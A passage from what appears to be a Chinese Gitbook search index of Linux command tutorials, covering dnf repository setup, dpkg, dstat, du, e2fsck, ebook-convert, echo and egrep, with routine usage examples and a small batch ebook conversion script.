|name=repository_name| 软件仓库（repository ）描述的字符串。| |baseurl=repository_url| 软件仓库（repository ）的地址。例如：使用http协议的网络位置： http://path/to/repo;使用ftp协议的网络位置： ftp://path/to/repo;本地位置： file:///path/to/local/repo| 配置/etc/yum.repos.d目录下的.repo文件 openEuler提供了多种repo源供用户在线使用，各repo源含义可参考系统安装。使用root权限添加openEuler repo源，示例如下： # vi /etc/yum.repos.d/openEuler.repo [OS] name=openEuler-$releasever - OS baseurl=https://repo.openeuler.org/openEuler-20.09/OS/$basearch/ enabled=1 gpgcheck=1 gpgkey=https://repo.openeuler.org/openEuler-20.09/OS/$basearch/RPM-GPG-KEY-openEuler 说明： enabled为是否启用该软件源仓库，可选值为1和0。默认值为1，表示启用该软件源仓库。 gpgkey为验证签名用的公钥 5.3 显示当前配置 要显示当前的配置信息： dnf config-manager --dump 要显示相应软件源的配置，首先查询repo id： dnf repolist 然后执行如下命令，显示对应id的软件源配置，其中 repository 为查询得到的repo id： dnf config-manager --dump repository 您也可以使用一个全局正则表达式，来显示所有匹配部分的配置： dnf config-manager --dump glob_expression 5.4 创建本地软件源仓库 要建立一个本地软件源仓库，请按照下列步骤操作 1.安装createrepo软件包。在root权限下执行如下命令 dnf install createrepo 2.将需要的软件包复制到一个目录下，如/mnt/local_repo/ 。 3.创建软件源，执行以下命令： createrepo --database /mnt/local_repo 5.5 添加软件源 要定义一个新的软件源仓库，您可以在 /etc/dnf/dnf.conf 文件中添加“repository”部分，或者在/etc/yum.repos.d/目录下添加“.repo”文件进行说明。建议您通过添加“.repo”的方式，每个软件源都有自己对应的“.repo”文件，以下介绍该方式的操作方法。 要在您的系统中添加一个这样的源，请在root权限下执行如下命令，执行完成之后会在/etc/yum.repos.d/目录下生成对应的repo文件。其中 repository_url 为repo源地址 dnf config-manager --add-repo repository_url 5.6 启用软件源 要启用软件源，请在root权限下执行如下命令，其中 repository 为新增.repo文件中的repo id（可通过dnf repolist查询）： dnf config-manager --set-enable repository 您也可以使用一个全局正则表达式，来启用所有匹配的软件源。其中 glob_expression 为对应的正则表达式，用于同时匹配多个repo id： dnf config-manager --set-enable glob_expression 5.7 禁用软件源 要禁用软件源，请在root权限下执行如下命令： dnf config-manager --set-disable repository 同样的，您也可以使用一个全局正则表达式来禁用所有匹配的软件源： dnf config-manager --set-disable glob_expression 6. 结论 DNF是最先进的包管理器 YUM 的上层状态。我相信，它往往会自动进行很多处理，这不会受到许多有经验的 Linux 系统管理员的称赞。例如： --skip-broken不被 DNF 认可，也别无选择。 没有什么比“ resolvedep ”命令更能运行，但是您可以运行 dnf 提供的命令。 没有“ deplist ”命令来查找包依赖项。 您排除一个 repo，意味着排除适用于所有操作，不像 yum 仅在安装和更新等时排除这些 repo。 更多阅读： linux yum linux apt linux dnf linux dnf docs linux snap Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_dpkg.html":{"url":"Linux-Command/Linux_Command_dpkg.html","title":"Linux Command Dpkg","keywords":"","body":"Linux Command dpkg 软件包管理1. 简介2. 语法2. 参数3. 示例Linux Command dpkg 软件包管理 tagsstart 软件包管理 tagsstop 图 1.2.17.1：在这里插入图片描述 1. 简介 dpkg 是Debian的一个底层包管理工具，主要用于对已下载到本地和已安装的软件包进行管理。 dpkg这个机制最早由Debian Linux社区所开发出来的，通过dpkg的机制，Debian提供的软件就能够简单的安装起来，同时能提供安装后的软件信息，实在非常不错。只要派生于Debian的其它Linux distributions大多使用dpkg这个机制来管理，包括B2D，Ubuntu等。 2. 语法 dpkg(选项)(参数) 2. 参数 选项 -i：安装软件包； -r：删除软件包； -P：删除软件包的同时删除其配置文件； -L：显示于软件包关联的文件； -l：显示已安装软件包列表； --unpack：解开软件包； -c：显示软件包内文件列表； --confiugre：配置软件包。 3. 示例 dpkg -r 卸载软件包.不是完全的卸载,它的配置文件还存在. dpkg --info \"软件包名\" --列出软件包解包后的包名称. dpkg -l --列出当前系统中所有的包.可以和参数less一起使用在分屏查看. dpkg -l |grep -i \"软件包名\" --查看系统中与\"软件包名\"相关联的包. dpkg -s packagename 查询已安装的包的详细信息. dpkg -L packagename 查询系统中已安装的软件包所安装的位置. dpkg -S 查询系统中某个文件属于哪个软件包. dpkg -I 查询deb包的详细信息,在一个软件包下载到本地之后看看用不用安装(看一下呗). dpkg -i 手动安装软件包(这个命令并不能解决软件包之前的依赖性问题),如果在安装某一个软件包的时候遇到了软件依赖的问题,可以用apt-get -f install在解决信赖性这个问题. dpkg -reconfigure 重新配置 dpkg -P 全部卸载(但是还是不能解决软件包的依赖性的问题) 参考： dpkg(1) — Linux manual page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-20 16:06:41 "},"Linux-Command/Linux_Command_dstat.html":{"url":"Linux-Command/Linux_Command_dstat.html","title":"Linux Command Dstat","keywords":"","body":"Linux Command dstat 性能分析1. 简介2. 安装方法3. 使用方法4. 示例Linux Command dstat 性能分析 tagsstart 分析 tagsstop 1. 简介 dstat 是一个可以取代vmstat，iostat，netstat和ifstat这些命令的多功能产品。dstat克服了这些命令的局限并增加了一些另外的功能，增加了监控项，也变得更灵活了。dstat可以很方便监控系统运行状况并用于基准测试和排除故障。 dstat可以让你实时地看到所有系统资源，例如，你能够通过统计IDE控制器当前状态来比较磁盘利用率，或者直接通过网络带宽数值来比较磁盘的吞吐率（在相同的时间间隔内）。 dstat将以列表的形式为你提供选项信息并清晰地告诉你是在何种幅度和单位显示输出。这样更好地避免了信息混乱和误报。更重要的是，它可以让你更容易编写插件来收集你想要的数据信息，以从未有过的方式进行扩展。 Dstat的默认输出是专门为人们实时查看而设计的，不过你也可以将详细信息通过CSV输出到一个文件，并导入到Gnumeric或者Excel生成表格中 结合了vmstat，iostat，ifstat，netstat以及更多的信息 实时显示统计情况 在分析和排障时可以通过启用监控项并排序 模块化设计 使用python编写的，更方便扩展现有的工作任务 容易扩展和添加你的计数器（请为此做出贡献） 包含的许多扩展插件充分说明了增加新的监控项目是很方便的 可以分组统计块设备/网络设备，并给出总数 可以显示每台设备的当前状态 极准确的时间精度，即便是系统负荷较高也不会延迟显示 显示准确地单位和和限制转换误差范围 用不同的颜色显示不同的单位 显示中间结果延时小于1秒 支持输出CSV格式报表，并能导入到Gnumeric和Excel以生成图形 2. 安装方法 Ubuntu/Mint和Debin系统： 本地软件库中有相关安装包，你可以用下面命令安装： # sudo apt-get install dstat RHEL/Centos和Fedora系统: 你可以在romforge软件库中添加有相关安装包，参照指导，使用如下命令很简单就能进行安装： # yum install dstat ArchLinux系统： 相关软件包在社区资源库中，你可以用这个命令来安装： # pacman -S dstat 3. 使用方法 dstat的基本用法就是输入dstat命令，输出如下： 图 1.2.18.1：在这里插入图片描述 这是默认输出显示的信息： CPU状态：CPU的使用率。这项报告更有趣的部分是显示了用户，系统和空闲部分，这 更好地分析了CPU当前的使用状况。如果你看到\"wait\"一栏中，CPU的状态是一个高使用率值，那说明系统存在一些其它问题。当CPU的状态处在\"waits\"时，那是因为它正在等待I/O设备（例如内存，磁盘或者网络）的响应而且还没有收到。 磁盘统计：磁盘的读写操作，这一栏显示磁盘的读、写总数。 网络统计：网络设备发送和接受的数据，这一栏显示的网络收、发数据总数。 分页统计：系统的分页活动。分页指的是一种内存管理技术用于查找系统场景，一个较大的分页表明系统正在使用大量的交换空间，或者说内存非常分散，大多数情况下你都希望看到page in（换入）和page out（换出）的值是0 0。 系统统计：这一项显示的是中断（int）和上下文切换（csw）。这项统计仅在有比较基线时才有意义。这一栏中较高的统计值通常表示大量的进程造成拥塞，需要对CPU进行关注。你的服务器一般情况下都会运行运行一些程序，所以这项总是显示一些数值。 默认情况下，dstat每秒都会刷新数据。如果想退出dstat，你可以按\"CTRL-C\"键。 需要注意的是报告的第一行，通常这里所有的统计都不显示数值的。 这是由于dstat会通过上一次的报告来给出一个总结，所以第一次运行时是没有平均值和总值的相关数据。 但是dstat可以通过传递2个参数运行来控制报告间隔和报告数量。例如，如果你想要dstat输出默认监控、报表输出的时间间隔为3秒钟,并且报表中输出10个结果，你可以运行如下命令： dstat 3 10 在dstat命令中有很多参数可选，你可以通过man dstat命令查看，大多数常用的参数有这些： -c：显示CPU系统占用，用户占用，空闲，等待，中断，软件中断等信息。 -C：当有多个CPU时候，此参数可按需分别显示cpu状态，例：-C 0,1 是显示cpu0和cpu1的信息。 -d：显示磁盘读写数据大小。 -D hda,total：include hda and total。 -n：显示网络状态。 -N eth1,total：有多块网卡时，指定要显示的网卡。 -l：显示系统负载情况。 -m：显示内存使用情况。 -g：显示页面使用情况。 -p：显示进程状态。 -s：显示交换分区使用情况。 -S：类似D/N。 -r：I/O请求情况。 -y：系统状态。 --ipc：显示ipc消息队列，信号等信息。 --socket：用来显示tcp udp端口状态。 -a：此为默认选项，等同于-cdngy。 -v：等同于 -pmgdsc -D total。 --output 文件：此选项也比较有用，可以把状态信息以csv的格式重定向到指定的文件中，以便日后查看。例：dstat --output /root/dstat.csv & 此时让程序默默的在后台运行并把结果输出到/root/dstat.csv文件中。 -t ：将当前时间显示在第一行 –fs ：显示文件系统统计数据（包括文件总数量和inodes值） –nocolor ：不显示颜色（有时候有用） –tcp ：显示常用的TCP统计 –udp ：显示监听的UDP接口及其当前用量的一些动态数据 当然不止这些用法，dstat附带了一些插件很大程度地扩展了它的功能。你可以通过查看/usr/share/dstat目录来查看它们的一些使用方法，常用的有这些： -–disk-util ：显示某一时间磁盘的忙碌状况 -–freespace ：显示当前磁盘空间使用率 -–proc-count ：显示正在运行的程序数量 -–top-bio ：指出块I/O最大的进程 -–top-cpu ：图形化显示CPU占用最大的进程 -–top-io ：显示正常I/O最大的进程 -–top-mem ：显示占用最多内存的进程 4. 示例 查看全部内存都有谁在占用： dstat -g -l -m -s --top-mem 显示一些关于CPU资源损耗的数据： dstat -c -y -l --proc-count --top-cpu 如想监控swap，process，sockets，filesystem并显示监控的时间： $ dstat -tsp --socket --fs ----system---- ----swap--- ---procs--- ------sockets------ --filesystem- date/time | used free|run blk new|tot tcp udp raw frg|files inodes 26-07 09:23:48| 0 0 | 0 0 0.0|104 8 5 0 0| 704 6488 26-07 09:23:49| 0 0 | 0 0 0|104 8 5 0 0| 704 6488 26-07 09:23:50| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 26-07 09:23:51| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 26-07 09:23:52| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 26-07 09:23:53| 0 0 | 0 0 0|104 8 5 0 0| 704 6489 如何输出一个csv文件 想输出一个csv格式的文件用于以后，可以通过下面的命令： dstat –output /tmp/sampleoutput.csv -cdn 参考: dstat Command in Linux With Examples dstat(1) - Linux man page Dstat – A Resourceful Tool to Monitor Linux Server Performance in Real-Time Examining Linux system performance with dstat Dstat linux monitoring tools Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 05:23:06 "},"Linux-Command/Linux_Command_du.html":{"url":"Linux-Command/Linux_Command_du.html","title":"Linux Command Du","keywords":"","body":"Linux Command du 查看文件大小1. 简介2. 格式3. 参数4. 实例4.1 显示目录或者文件所占空间4.2 显示指定文件所占空间4.3 查看指定目录的所占空间4.4 显示多个文件所占空间4.5 只显示总和的大小4.6 方便阅读的格式显示4.7 文件和目录都显示4.8 显示指定文件占用磁盘空间4.9 按照空间大小排序4.10 输出当前目录下各个子目录所使用的空间Linux Command du 查看文件大小 tagsstart 文件管理 tagsstop 图 1.2.19.1：在这里插入图片描述 1. 简介 Linux du显示每个文件和目录的磁盘使用空间。，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看。 2. 格式 du [选项][文件] 3. 参数 -a或-all 显示目录中个别文件的大小。 -b或-bytes 显示目录或文件大小时，以byte为单位。 -c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。 -k或--kilobytes 以KB(1024bytes)为单位输出。 -m或--megabytes 以MB为单位输出。 -s或--summarize 仅显示总计，只列出最后加总的值。 -h或--human-readable 以K，M，G为单位，提高信息的可读性。 -x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。 -L或--dereference 显示选项中所指定符号链接的源文件大小。 -S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小。 -X或--exclude-from= 在指定目录或文件。 --exclude= 略过指定的目录或文件。 -D或--dereference-args 显示指定符号链接的源文件大小。 -H或--si 与-h参数相同，但是K，M，G是以1000为换算单位。 -l或--count-links 重复计算硬件链接的文件。 4. 实例 4.1 显示目录或者文件所占空间 [root@localhost test]# du [root@data2 ~]# du 8 ./.ssh 4 ./.cache/abrt 4 ./.cache 0 ./.config/abrt 0 ./.config 1100 ./cos 0 ./.distlib/resource-cache 0 ./.distlib 456 ./pip-package 4 ./.pip 7696 ./xtrabackup 4 ./.docker 48 ./ansible-check/rds-os-precheck 52 ./ansible-check/rds_check_az1 48 ./ansible-check/rds_check_az2 176 ./ansible-check 4.2 显示指定文件所占空间 [root@localhost test]# du log2012.log 300 log2012.log 4.3 查看指定目录的所占空间 [root@localhost test]# du scf 4 scf/lib 4 scf/service/deploy/product 4 scf/service/deploy/info 12 scf/service/deploy 16 scf/service 4 scf/doc 4 scf/bin 32 scf 4.4 显示多个文件所占空间 [root@localhost test]# du log30.tar.gz log31.tar.gz 4 log30.tar.gz 4 log31.tar.gz 4.5 只显示总和的大小 [root@localhost test]# du -s 1288 . [root@localhost test]# du -s scf 32 scf [root@localhost test]# cd .. [root@localhost soft]# du -s test 1288 test 4.6 方便阅读的格式显示 [root@localhost soft]# du -h test 608K test/test6 308K test/test4 4.0K test/scf/lib 4.0K test/scf/service/deploy/product 4.0K test/scf/service/deploy/info 12K test/scf/service/deploy 16K test/scf/service 4.0K test/scf/doc 4.0K test/scf/bin 32K test/scf 8.0K test/test3 1.3M test 4.7 文件和目录都显示 [root@localhost soft]# du -ah test 4.0K test/log31.tar.gz 4.0K test/test13.tar.gz 0 test/linklog.log 0 test/test6/log2014.log 300K test/test6/linklog.log 0 test/test6/log2015.log 4.0K test/test6/log2013.log 300K test/test6/log2012.log 4.8 显示指定文件占用磁盘空间 还统计它们的总和 [root@localhost test]# du -c log30.tar.gz log31.tar.gz 4 log30.tar.gz 4 log31.tar.gz 8 总计 4.9 按照空间大小排序 [root@localhost test]# du|sort -nr|more 1288 . 608 ./test6 308 ./test4 32 ./scf 16 ./scf/service 4.10 输出当前目录下各个子目录所使用的空间 [root@localhost test]# du -h --max-depth=1 608K ./test6 308K ./test4 32K ./scf 8.0K ./test3 1.3M . Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:31:42 "},"Linux-Command/Linux_Command_e2fsck.html":{"url":"Linux-Command/Linux_Command_e2fsck.html","title":"Linux Command E 2 Fsck","keywords":"","body":"Linux Command e2fsck1. 简介2. 语法3. 参数4. 实例4.1 检查硬盘4.2 检查逻辑卷Linux Command e2fsck tagsstart 分析 tagsstop 1. 简介 Linux e2fsck命令用于检查使用 Linux ext2 档案系统的 partition 是否正常工作。 2. 语法 e2fsck [-pacnydfvFV] [-b superblock] [-B blocksize] [-l|-L bad_blocks_file] [-C fd] device 3. 参数 device ： 预备检查的硬盘 partition，例如：/dev/sda1 -a : 对 partition 做检查，若有问题便自动修复，等同 -p 的功能 -b : 设定存放 superblock 的位置 -B : 设定单位 block 的大小 -c : 检查该partition 是否有坏轨 -C file : 将检查的结果存到 file 中以便查看 -d : 列印 e2fsck 的 debug 结果 -f : 强制检查 -F : 在开始检查前，将device 的 buffer cache 清空，避免有错误发生 -l bad_blocks_file : 将有坏轨的block资料加到 bad_blocks_file 里面 -L bad_blocks_file : 设定坏轨的block资料存到 bad_blocks_file 里面，若无该档则自动产生 -n : 将档案系统以[唯读]方式开启 -p : 对 partition 做检查，若有问题便自动修复 -v : 详细显示模式 -V : 显示出目前 e2fsck 的版本 -y : 预先设定所有检查时的问题均回答[是] 4. 实例 4.1 检查硬盘 如果有异常便自动修复，并且设定若有问答，均回答[是] : e2fsck -a -y /dev/hda5 注意 : 大部份使用 e2fsck 来检查硬盘 partition 的情况时，通常都是情形特殊，因此最好先将该 partition umount，然后再执行 e2fsck 来做检查，若是要非要检查 / 时，则请进入 singal user mode 再执行。 4.2 检查逻辑卷 如发现问题便自动修复: e2fsck -a /dev/mapper/VolGroup00-LogVol02 执行 e2fsck 或 fsck 前请先 umount partition，否则有机会令档案系统毁损。 分区忙的情况，需要将所有涉及该分区的进程杀掉，有个快速的方法是执行 fuser -k /home 。 如果需要对根目录 (/) 进行检查及修复，便需要进入 singal user mode 执行。 最后别忘了将分区mount上。 更多阅读： e2fsck(8) — Linux manual page e2fsck Command Examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:37:58 "},"Linux-Command/Linux_Command_ebook-convert.html":{"url":"Linux-Command/Linux_Command_ebook-convert.html","title":"Linux Command Ebook Convert","keywords":"","body":"Linux Commnad ebook-convert 转换电子书1. 简介2. 安装3. 实例3.1 epub 转换与 Kindle 兼容的 azw33.2 .epub 转换 .mobi4. Ebook-polish 命令4.1 一次批量转换多个电子书文件的脚本Linux Commnad ebook-convert 转换电子书 tagsstart 文本管理 tagsstop 图 1.2.21.1：在这里插入图片描述 1. 简介 Ebook-convert 命令允许您将电子书从一种格式转换为另一种格式。您还可以在转换为另一种格式时更改电子书的外观。外观选项允许您更改字体属性、设置自定义 CSS 样式、更改内容对齐方式、删除现有 CSS 样式、嵌入字体、删除空行、修改缩进、更改边距、修改行高和替换标点字符。ebook-convert 命令还允许您使用名为启发式处理的选项更改书籍结构和布局。您可以使用此选项删除连字符、修改标题、居中内容、更改错误缩进、删除空白段落等。 Ebook-convert 命令也可用于搜索和替换电子书的内容。它的一个选项还允许您更改封面图像。您还可以使用它来修改书籍元数据，如作者姓名、标题、出版年份等。它还包括一个修改目录的选项。以下是 ebook-convert 命令的一些示例： 2. 安装 apt install calibre 安装后，您现在应该在系统上拥有 ebook-convert 和 ebook-polish 命令 3. 实例 3.1 epub 转换与 Kindle 兼容的 azw3 ebook-convert file.epub file.azw3 如果您从本地文件夹执行 ebook-convert 命令的预编译二进制文件，请运行以下命令： ./ebook-convert file.epub file.azw3 3.2 .epub 转换 .mobi ebook-convert file.epub file.mobi 要更改电子书内容的对齐方式，请使用以下格式的命令： ebook-convert file.epub file.azw3 --change-justification justify –change-justification 参数接受 left 、 right 、 original 和 justify 作为可能的值。您可以从这里了解有关所有外观和感觉选项的更多信息。如果您想一次使用多个选项，请使用以下格式的命令： ebook-convert file.epub file.azw3 --change-justification justify --remove-paragraph-spacing 如果您想使用启发式处理功能，您必须先启用它 ebook-convert file.epub file.azw3 --enable-heuristics --disable-dehyphenate 4. Ebook-polish 命令 ebook-poilsh 命令仅适用于 epub 和 azw3 文件格式。它可用于修改现有电子书文件的属性和样式。与 ebook-convert 命令不同，它不会将电子书文件转换为另一种格式，而是对作为参数提供的现有电子书文件进行更改。 您可以使用 ebook-polish 命令添加和删除软连字符、更改封面图像、嵌入自定义字体、压缩图像等。下面是一个带有多个选项的 ebook-polish 命令示例，其中 file.epub 被抛光为 polish_file.epub 文件。 ebook-polish --add-soft-hyphens --upgrade -book file.epub Polish_file.epub 4.1 一次批量转换多个电子书文件的脚本 可以一次将多个 epub 文件批量转换为azw3文件 #! /bin/bash function convert () { filename=\"$1\" extension=\"${filename##*.}\" root=\"${filename%.*}\" outputExtension=\".azw3\" convertedName=\"${root}_converted${outputExtension}\" polishedName=\"${root}_converted_and_polished${outputExtension}\" echo \"\" echo \"++++++ Converting book: $filename ++++++\" ./ebook-convert \"$filename\" \"$convertedName\" \\ --change-justification justify \\ --margin-left 0 \\ --margin-right 0 \\ --margin-top 0 \\ --margin-bottom 0 \\ --remove-paragraph-spacing \\ --remove-paragraph-spacing-indent-size 1.0 \\ --filter-css font-family sleep 0.1 echo \"\" echo \"++++++ Polishing book: $convertedName ++++++\" ./ebook-polish --add-soft-hyphens --upgrade-book \"$convertedName\" \"$polishedName\" sleep 0.1 echo \"\" echo \"++++++ Removing obsolete file: $convertedName ++++++\" rm \"$convertedName\" sleep 0.1 echo \"\" echo \"++++++ Done, final book is: $polishedName ++++++\" echo \"\" } for name in \"$@\" do echo \"++++++ Staring conversion of: \"$name\" ++++++\" convert \"$name\" sleep 0.1 done 执行： $ ./convert_epub_to_azw3.sh file.epub $ ./convert_epub_to_azw3.sh *.epub 参考： ebook-convert command Convert and Optimize Ebooks in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_echo.html":{"url":"Linux-Command/Linux_Command_echo.html","title":"Linux Command Echo","keywords":"","body":"Linux Command echo1. 简介2. 转义3. 用法标准输出显示变量显示转义字符显示文件输出匹配文件定向输入文件彩色打印显示命令执行结果\\b 选项删除字符间的所有空格\\n 选项换行\\t 选项加水平制表符换行 \\n 与水平制表符 \\t\\v 选项垂直制表符换行 \\n 与垂直制表符 \\v\\r 选项回车符\\c 选项不换行-n 会在echo完后不会输出新行\\a 选项声音警告脚本feed.shLinux Command echo tagsstart 文本处理 tagsstop 1. 简介 echo是一种最常用的与广泛使用的内置于Linux的bash和C shell的命令，通常用在脚本语言和批处理文件中来在标准输出或者文件中显示一行文本或者字符串。 echo是一个内置shell命令。echo的行为与其他流行的shell一样，如Zsh和Ksh。但它们的行为与shell之间略有不同。 2. 转义 选项 描述 -n 不输出末尾的换行符。 -e 启用反斜线转义。 \\b 退格 \\ 反斜线 \\n 新行 \\r 回车 \\t 水平制表符 \\v 垂直制表符 3. 用法 标准输出 $ echo Tecmint is a community of Linux Nerds Tecmint is a community of Linux Nerds 显示变量 比如，声明变量x并给它赋值为10。 $ x=10 $ echo The value of variable x = $x The value of variable x = 10 显示转义字符 $ echo \"\\\"It is a test\\\"\" \"It is a test\" 显示文件 $ echo * 103.odt 103.pdf 104.odt 104.pdf 105.odt 105.pdf 106.odt 106.pdf 107.odt 107.pdf 108a.odt 108.odt 108.pdf 109.odt 109.pdf 110b.odt 110.odt 110.pdf 111.odt 111.pdf 112.odt 112.pdf 113.odt linux-headers-3.16.0-customkernel_1_amd64.deb linux-image-3.16.0-customkernel_1_amd64.deb network.jpeg 输出匹配文件 比如，让我们假设你想要打印所有的‘.jpeg‘文件，使用下面的命令。 $ echo *.jpeg network.jpeg 定向输入文件 $ echo \"Test Page\" > testpage $ cat testpage Test Page 彩色打印 你可使用ANSI转义序列更改前景色和背景色或设置下划线和粗体等文本属性。 echo -e \"\\033[1;37mWHITE\" #打印白色 echo -e \"\\033[0;30mBLACK\" #打印黑色 echo -e \"\\033[0;34mBLUE\" #打印蓝色 echo -e \"\\033[0;32mGREEN\" #打印绿色 echo -e \"\\033[0;36mCYAN\" #打印青蓝色 echo -e \"\\033[0;31mRED\" #打印红色 echo -e \"\\033[0;35mPURPLE\" #打印紫色。 显示命令执行结果 $ echo `date` Tue Jun 28 11:59:39 UTC 2022 \\b 选项删除字符间的所有空格 -e‘后带上'\\b'会删除字符间的所有空格。 [!NOTE|style:flat|lable:Mylable|iconVisibility:hidden] Linux中的选项‘-e‘扮演了转义字符反斜线的翻译器。 $ echo -e \"Tecmint \\bis \\ba \\bcommunity \\bof \\bLinux \\bNerds\" TecmintisacommunityofLinuxNerds \\n 选项换行 -e‘后面的带上‘\\n’行会换行 $ echo -e \"Tecmint \\nis \\na \\ncommunity \\nof \\nLinux \\nNerds\" Tecmint is a community of Linux Nerds \\t 选项加水平制表符 -e‘后面跟上‘\\t’会在空格间加上水平制表符。 $ echo -e \"Tecmint \\tis \\ta \\tcommunity \\tof \\tLinux \\tNerds\" Tecmint is a community of Linux Nerds 换行 \\n 与水平制表符 \\t $ echo -e \"\\n\\tTecmint \\n\\tis \\n\\ta \\n\\tcommunity \\n\\tof \\n\\tLinux \\n\\tNerds\" Tecmint is a community of Linux Nerds \\v 选项垂直制表符 ‘-e‘后面跟上‘\\v’会加上垂直制表符。 $ echo -e \"\\vTecmint \\vis \\va \\vcommunity \\vof \\vLinux \\vNerds\" Tecmint is a community of Linux Nerds 换行 \\n 与垂直制表符 \\v $ echo -e \"\\n\\vTecmint \\n\\vis \\n\\va \\n\\vcommunity \\n\\vof \\n\\vLinux \\n\\vNerds\" Tecmint is a community of Linux Nerds [!NOTE|style:flat|lable:Mylable|iconVisibility:hidden] 你可以按照你的需求连续使用两个或者多个垂直制表符，水平制表符与换行符。 \\r 选项回车符 -e‘后面跟上‘\\r’来指定输出中的回车符。（LCTT 译注：会覆写行开头的字符） $ echo -e \"Tecmint \\ris a community of Linux Nerds\" is a community of Linux Nerds \\c 选项不换行 -e‘后面跟上‘\\c’会抑制输出后面的字符并且最后不会换新行。 $ echo -e \"Tecmint is a community \\cof Linux Nerds\" Tecmint is a community @tecmint:~$ -n 会在echo完后不会输出新行 $ echo -n \"Tecmint is a community of Linux Nerds\" Tecmint is a community of Linux Nerds@tecmint:~/Documents$ \\a 选项声音警告 -e‘后面跟上‘\\a’选项会听到声音警告。 $ echo -e \"Tecmint is a community of \\aLinux Nerds\" Tecmint is a community of Linux Nerds 脚本 feed.sh $ cat feed.sh #!/bin/bash # This script acts upon the exit status given by penguin.sh if [ \"$#\" != \"2\" ]; then echo -e \"Usage of the feed script:\\t$0 food-on-menu animal-name\\n\" exit 1 else export menu=\"$1\" export animal=\"$2\" echo -e \"Feeding $menu to $animal...\\n\" feed=\"/nethome/anny/testdir/penguin.sh\" $feed $menu $animal result=\"$?\" echo -e \"Done feeding.\\n\" case \"$result\" in 1) echo -e \"Guard: \\\"You'd better give'm a fish, less they get violent...\\\"\\n\" ;; 2) echo -e \"Guard: \\\"No wonder they flee our planet...\\\"\\n\" ;; 3) echo -e \"Guard: \\\"Buy the food that the Zoo provides at the entry, you ***\\\"\\n\" echo -e \"Guard: \\\"You want to poison them, do you?\\\"\\n\" ;; *) echo -e \"Guard: \\\"Don't forget the guide!\\\"\\n\" ;; esac fi echo \"Leaving...\" echo -e \"\\a\\a\\aThanks for visiting the Zoo, hope to see you again soon!\\n\" 执行： michel ~/test> feed.sh apple camel Feeding apple to camel... Will you read this sign?! Don't feed the camels! Done feeding. Guard: \"Buy the food that the Zoo provides at the entry, you ***\" Guard: \"You want to poison them, do you?\" Leaving... Thanks for visiting the Zoo, hope to see you again soon! michel ~/test> feed.sh apple Usage of the feed script: ./feed.sh food-on-menu animal-name 参考： runoob Shell echo命令 Using the echo built-in command 15 Practical Examples of ‘echo’ command in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-28 12:09:11 "},"Linux-Command/Linux_Command_egrep.html":{"url":"Linux-Command/Linux_Command_egrep.html","title":"Linux Command Egrep","keywords":"","body":"Linux Command egrep1. 特点2. 举例Linux Command egrep tagsstart 文件管理 tagsstop 1. 特点 基本曾则：优点（兼容性强，缺点（繁琐）） 拓展：优点（简单），缺点：（兼容性弱） egrep：grep -E 2. 举例 grep '^r' /etc/passwd----'^id' /etc/inittab----------'^HOSTNAME' /etc/sysconfig/network grep 'localhost$' /etc/hosts #匹配以某字符结尾的内容 grep '^root\\|^daemon' /etc/passwd #（基本）多条件显示内容 egrep '^root|^daemon' /etc/passwd #（扩展）多条件显示内容 grep -q '^192.168.4.4' /etc/hosts && echo \"YES\" || echo \"NO\" #选项 -q 表示 quiet（静默）的意思，结合此选项可以只做检索而并不输出，通常在脚本内用来识别查找的目标是否存在，通过返回状态 $? 来判断，这样可以忽略无关的文本信息 egrep '/sbin/nologin$' /etc/passwd ///确认是否正确 #统计本地用户中登录Shell为“/sbin/nologin”的用户个数 egrep -c '/sbin/nologin$' /etc/passwd #统计个数 egrep '/bin/bash$' /etc/passwd | wc -l #统计个数 egrep '.' /etc/rc.local #显示非空行的内容 egrep -v '.' /etc/rc.local #显示空行 egrep '^$' /etc/rc.local #显示空行 egrep 'f+' /etc/rc.loca #至少出现一次 egrep 'init(ial)?' /etc/rc.local #匹配出现init，initab的行 egrep 'stuf*' /etc/rc.local #匹配stuf后面出现任意次数的行 egrep '^r.*nologin$' /etc/passwd #.*匹配任意多个字符的行（首，尾之间） 元字符 {} —— 限定出现的次数范围 egrep '(ab){3}' brace.txt #匹配ab出现3次的行 egrep '(ab){2,4}' brace.txt #匹配ab出现2，4次的行 egrep '(ab){3,}' brace.txt #匹配ab至少出现3次的行 元字符 [] —— 匹配范围内的单个字符 egrep 'ab[cd]' brace.txt egrep '[A-Z]' brace.tx egrep '[^ a-zA-Z]' brace.txt 单词边界匹配 egrep '\\binit\\b' /etc/rc.local #同 egrep '\\' /etc/rc.local #同 egrep 'll\\>' /etc/rc.local egrep 'll\\b' /etc/rc.local 多个条件的组合 egrep '\\|\\' /var/log/dmesg #通过dmesg启动日志查看与IDE接口、CDROM光盘相关的设备信息 egrep -i 'eth|network|bluetooth' /var/log/dmesg #通过dmesg启动日志查看蓝牙设备、网卡设备相关的信息 利用正则表达式完成检索任务 egrep -c \".*\" /etc/httpd/conf/httpd.conf #总行数 egrep -c \"#\" /etc/httpd/conf/httpd.conf #显示注释行数 egrep -c \"^$\" /etc/httpd/conf/httpd.con #显示空行数 egrep -c -v '#|^$' /etc/httpd/conf/httpd.conf #显示除掉空行与注释行的行数 匹配MAC地址、邮箱地址、IP地址 echo $MAC01 | egrep -q '[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}' && echo \"有效\" || echo \"无效\" #检查MAC地址是否有效 